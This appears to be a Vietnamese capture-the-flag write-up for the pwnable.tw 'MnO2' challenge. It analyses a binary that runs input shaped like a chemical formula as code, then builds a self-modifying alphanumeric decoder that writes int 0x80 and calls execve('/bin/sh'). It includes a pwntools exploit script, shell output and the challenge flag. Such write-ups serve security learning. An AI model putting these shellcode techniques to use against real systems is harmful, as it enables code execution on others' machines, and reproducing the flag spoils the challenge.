+++
title = 'Pwnable.tw - MnO2'
date = 2026-09-22T07:15:27+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## MnO2

`nc chall.pwnable.tw 10301`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/MnO2/mno2
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

NX/RELRO/PIE đều không liên quan ở đây - chương trình tự tay đưa cho ta một page **RWX** rồi nhảy vào đó.

`main` @ `0x8048741`:

```c
mmap((void*)0x324F6000, 0x8000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS, -1, 0);
__isoc99_scanf("%s", (void*)0x324F6E4D);
v3 = strlen((char*)0x324F6E4D);
memset((void*)(0x324F6E4D + v3), 0, 29107 - v3);
check((char*)0x324F6E4D);
((void(*)())0x324F6E4D)();            // chạy thẳng input như machine code
exit(0);
```

Buffer `0x324F6E4D` nằm trong vùng RWX `MAP_FIXED` `0x324F6000-0x324FE000`, địa chỉ cố định nên không cần leak, local giống hệt remote.

#### `check()` - ràng buộc

`check()` @ `0x8048579` bắt input phải là một **công thức hoá học hợp lệ** ghép từ ký hiệu nguyên tố thật:

1. Mọi byte phải alphanumeric `[0-9A-Za-z]`
2. Chuỗi phải tách được thành dãy ký hiệu nguyên tố, mỗi cái có thể kèm số đếm:
   - token bắt đầu bằng chữ hoa `[A-Z]`
   - byte kế là chữ thường → ký hiệu **2 chữ** (ví dụ `He`), phải có trong bảng
   - byte kế là chữ số → ký hiệu **1 chữ** + số đếm
   - còn lại → ký hiệu **1 chữ** đứng riêng
   - bảng nguyên tố là 114 ký hiệu ở `elements[]` @ `0x804A060`

Chi tiết tinh vi làm hỏng lần thử đầu: chữ số **đầu tiên** sau ký hiệu 1 chữ được kiểm bằng `c <= 0x30 || c > 0x39`, nên `'0'` (`0x30`) **bị từ chối** ở vị trí đầu, chỉ `'1'..'9'` hợp lệ. `'0'` chỉ được phép ở vị trí chữ số thứ hai trở đi. Hệ quả cho encoder: **không chữ hoa nào được đứng ngay trước byte `0x30`**.

Binary không có `int 0x80` ở đâu cả, nên phải **tự tổng hợp hai byte `CD 80` lúc chạy**.

### 2. Khai thác

#### Bộ lệnh dùng được

Byte hợp lệ là `[0-9A-Za-z]`. Các lệnh ngắn mà opcode của chúng cũng hợp lệ về ngữ pháp:

| bytes | lệnh | vai trò ngữ pháp |
|---|---|---|
| `35 ii ii ii ii` | `XOR EAX, imm32` (clear CF) | `'5'` + imm |
| `48` | `DEC EAX` | `'H'` (Hydrogen) |
| `50` | `PUSH EAX` | `'P'` (Phosphorus) |
| `58 65` | `POP EAX ; (gs:)` | `"Xe"` (Xenon) |
| `5A 72 dd` | `POP EDX ; JB rel8` | `"Zr"` (Zirconium) + disp |
| `42` | `INC EDX` | `'B'` (Boron) |
| `43` | `INC EBX` | `'C'` (Carbon) |
| `68 vv vv vv vv` | `PUSH imm32` | `'h'` sau `'B'` → `"Bh"` (Bohrium) |
| `43 61` | `INC EBX ; POPA` | `"Ca"` (Calcium) |
| `36 30 42 dd` | `SS: XOR [EDX+disp8], AL` | `'6'` + `'0'` + `'B'` + disp |

Byte dùng làm immediate lấy từ pool 24 byte mà mọi chữ hoa trong đó cũng là nguyên tố 1 chữ hợp lệ: các chữ số `0x30-0x39` cộng `{B,C,F,H,I,K,N,O,P,S,U,V,W,Y}`.

#### Khả năng XOR - đo chứ không đoán

Liệt kê vét cạn bằng Python cho thấy XOR các byte trong pool có cấu trúc chẵn lẻ rất cứng:

- XOR **đúng 3 số hạng** phủ đúng `[0x20, 0x5F]`
- XOR **đúng 4 số hạng** phủ đúng `[0, 0x1F]` và `[0x60, 0x7F]`

Hai nửa rời nhau. Một địa chỉ đầy đủ trong vùng (ví dụ `0x324F73xx`) trộn cả hai lớp, nên **không có chuỗi XOR đồng nhất nào dựng được địa chỉ**. Thay vào đó dựng địa chỉ theo kiểu thuận ngữ pháp:

`PUSH imm32` với 16 bit thấp là ASCII của một nguyên tố 2 chữ thật, 16 bit cao là `"O2"` (`0x4F, 0x32`):

```js
addr = 0x324F0000 | (ord(sym[1])<<8) | ord(sym[0])
"As" -> 0x324F7341,  "BhAsO2" push giá trị đó
```

Các địa chỉ này rơi vào `0x324F6142 ... 0x324F7944`, đều nằm trong vùng RWX.

#### Decoder tự ghi

Input là một decoder tự sửa chính mình:

1. Trỏ `EDX` vào vùng nháp, ghi `"/bin/sh\0"` từng byte bằng `XOR [EDX+disp], AL`
2. Trỏ `EDX` vào **địa chỉ ngay sau decoder**, ghi hai byte `CD 80` vào đó - decoder chạy xong là rơi thẳng vào một `int 0x80` vừa được tạo ra
3. Dựng khung syscall bằng `PUSH` + `POPA`: `EAX=0xB`, `EBX=&"/bin/sh"`, `ECX=0`, `EDX=0`
4. Rơi vào `int 0x80` → `execve("/bin/sh", NULL, NULL)`

Mấy chi tiết kỹ thuật đáng nhớ:

- **`EAX` có trạng thái.** `XOR EAX, imm` cộng dồn lên `EAX` hiện tại chứ không phải 0. Encoder phải theo dõi giá trị 32 bit của `EAX` một cách ký hiệu ở từng bước và tính mỗi chain như một delta. Sai chỗ này thì mọi byte sau đó hỏng âm thầm.
- **`disp8` phải là chữ số**, và chữ số đầu không được là `0x30`. Nên các lần ghi dùng `disp = 0x31 + i`, byte rơi vào `EDX + 0x31 + i`; `EBX` được tăng thêm `0x31` (`INC EBX` x0x31) sau `POPA` để trỏ đúng chuỗi.
- **Prefix `0x36` (SS:) trước mỗi lần ghi.** Opcode ghi là `0x30`, không hợp lệ ngay sau chữ hoa. Chèn `0x36` (`'6'`, segment override vô hại trong flat 32-bit) biến `...H` `0` thành `...H6` `0`, giữ chuỗi hợp lệ mà không đổi ngữ nghĩa vì `ss.base == ds.base`.
- **Giữ CF sạch cho `POP EDX`.** Chuỗi `"Zr"` là `POP EDX ; JB rel8`, nhánh `JB` không được nhảy, nên phải có một `XOR` clear CF ngay trước; `INC`/`PUSH`/`POP` không đụng CF.

Layout đo được: decoder dài 587 bytes → chọn `p_int80 = "Ar"` = `0x324F7241`, nên `int80_addr = 0x324F7272`; pad bằng `'H'` (`DEC EAX`) để decoder kết thúc đúng tại `int80_addr`. `string_addr = 0x324F7372`. Payload tổng **1061 bytes**, toàn alphanumeric.

#### Chuỗi xác minh

1. Viết lại `check()` bằng Python (gồm cả luật chữ số đầu `0x30`), chạy trên payload → `True`
2. Emulate bằng Unicorn trong page RWX giả: tới được `int 0x80` với `eax=0xB`, `ebx` trỏ `"/bin/sh\0"`, `ecx=edx=0`
3. Chạy thật local → shell thật
4. Remote cùng payload → `uid=1000(mno2)` và flag

```bash
$ echo REMOTE_$(id)
REMOTE_uid=1000(mno2) gid=1000(mno2) groups=1000(mno2)
$ cat /home/*/flag
FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}
```

```py
#!/usr/bin/env python3
from pwn import *
context.arch = 'i386'
from mno2_build import build, validate, SORTED_ADDRS, DISP   # DISP = 0x31

BASE = 0x324F6E4D
L = len(build(SORTED_ADDRS[0], SORTED_ADDRS[1]))              # đo độ dài decoder
p_int80 = next(x for x in SORTED_ADDRS if x + DISP >= BASE + L)
int80_addr = p_int80 + DISP
pad = int80_addr - (BASE + L)
p_string = next(x for x in SORTED_ADDRS if x + DISP >= int80_addr + 2 + 64)
payload = b"H"*pad + build(p_string, p_int80)                 # 'H' = DEC EAX padding
assert BASE + len(payload) == int80_addr and validate(payload)

p = remote("chall.pwnable.tw", 10301) if args.REMOTE else process("./mno2")
p.sendline(payload)
p.interactive()
```

`mno2_build.py` là trình biên dịch shellcode ràng buộc: validator ngữ pháp nguyên tố, bảng nhân chứng XOR, lớp `Emit` theo dõi trạng thái thanh ghi, và `build()`.
